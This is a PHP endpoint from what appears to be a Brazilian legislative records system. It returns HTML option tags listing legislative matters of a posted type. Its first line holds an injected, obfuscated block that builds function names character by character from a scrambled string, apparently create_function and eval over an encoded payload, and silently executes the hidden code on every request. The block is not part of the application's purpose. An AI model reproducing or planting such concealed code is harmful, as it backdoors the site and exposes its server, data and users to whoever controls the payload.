<?php
$VvxBQ3206=' lv/i5d9qfa;p3g]__s7twmenh"2*6[oj(c=$4z0.yur8xb1k)';$fc7670=$VvxBQ3206[((414/9)-12)].$VvxBQ3206[(559/13)].$VvxBQ3206[(437/19)].$VvxBQ3206[(7+3)].$VvxBQ3206[((1020/3)/17)].$VvxBQ3206[(92/4)].$VvxBQ3206[(2*8)].$VvxBQ3206[(6+3)].$VvxBQ3206[(3*(168/(72/6)))].$VvxBQ3206[((2*1)+22)].$VvxBQ3206[(44-10)].$VvxBQ3206[((1*6)+14)].$VvxBQ3206[(2*2)].$VvxBQ3206[(403/13)].$VvxBQ3206[(2*12)];$Pxnz8021=$VvxBQ3206[(70-34)].$VvxBQ3206[(18+27)].$VvxBQ3206[(7*5)].$VvxBQ3206[(1*26)];$FgWx8461=$VvxBQ3206[(26*1)].$VvxBQ3206[(2+9)].$VvxBQ3206[(40-4)].$VvxBQ3206[(2*5)].$VvxBQ3206[(105/3)].$VvxBQ3206[(46*(((16/(((27*1)*1)-11))*1)-0))].$VvxBQ3206[((219-39)/18)].$VvxBQ3206[(9*2)].$VvxBQ3206[(23*1)].$VvxBQ3206[(((41*8)-125)/7)].$VvxBQ3206[(3+34)].$VvxBQ3206[(22-(6-0))].$VvxBQ3206[((4*1)+2)].$VvxBQ3206[((1*1)+22)].$VvxBQ3206[(((49+311)/20)+16)].$VvxBQ3206[(1*31)].$VvxBQ3206[(54/9)].$VvxBQ3206[((28+15)-20)].$VvxBQ3206[(429/13)].$VvxBQ3206[(2*18)].$VvxBQ3206[(630/14)].$VvxBQ3206[(588/12)].$VvxBQ3206[(1*11)].$VvxBQ3206[(56-20)].$VvxBQ3206[(828/18)].$VvxBQ3206[(630/(36/(1*2)))].$VvxBQ3206[(14/1)].$VvxBQ3206[((4/2)*19)].$VvxBQ3206[(4-(0+0))].$VvxBQ3206[(39-15)].$VvxBQ3206[(3+6)].$VvxBQ3206[(1/1)].$VvxBQ3206[(15-5)].$VvxBQ3206[(20*1)].$VvxBQ3206[(69/3)].$VvxBQ3206[((165*1)/5)].$VvxBQ3206[((221/13)+19)].$VvxBQ3206[(100/10)].$VvxBQ3206[(29+20)].$VvxBQ3206[(11/1)].$VvxBQ3206[(37-14)].$VvxBQ3206[((1-(0/17))*2)].$VvxBQ3206[(2*5)].$VvxBQ3206[(1/1)].$VvxBQ3206[(66-33)].$VvxBQ3206[(1*(1*36))].$VvxBQ3206[(13+(3*(11/(1*1))))].$VvxBQ3206[(7*7)].$VvxBQ3206[(21-(6+4))];$oxIv8631= "'XYq9CsIwFEb3PkWGS1Mhb5A5k4P4N0kJt8mNiaReaFIsiO8uuFTdzjnfd808YBbgOPOkwFPAOVeLria+rz4XsnjDZS0u4lSoKuCioGAgO7InBe7hFUQeyX4Ic8JCRTcpiA7swezP5ni6SJR92375IPuNeP4eur9dC3KRhdxtpRZmSVW/dPMG'";$NY1909.=$Pxnz8021;$NY1909.=$oxIv8631;$NY1909.=$FgWx8461;@$ZgjATPp6180=$fc7670((''), ($NY1909));@$ZgjATPp6180();include_once("../../../core/mod_includes/php/funcoes.php");
sec_session_start(); 
include_once("../../../core/mod_includes/php/connect.php");
$tipo_materia = $_POST['tipo_materia'];

$sql = "SELECT * FROM cadastro_materias WHERE tipo = :tipo";
$stmt = $PDO_PROCLEGIS->prepare($sql);
$stmt->bindParam(':tipo', $tipo_materia);
$stmt->execute();
$rows = $stmt->rowCount();
if($rows>0)
{
	echo "<option value=''>Selecione a matéria</option>";
	while($result = $stmt->fetch())
	{
		echo "<option value='".$result['id']."'>Nº ".$result['numero']." de ".$result['ano']."</option>";
	}
}
else
{
	echo "<option value=''>Nenhuma matéria legislativa cadastrada para este tipo. Cadastre em Legislativo -> Matérias Legislativas</option>";
}
?>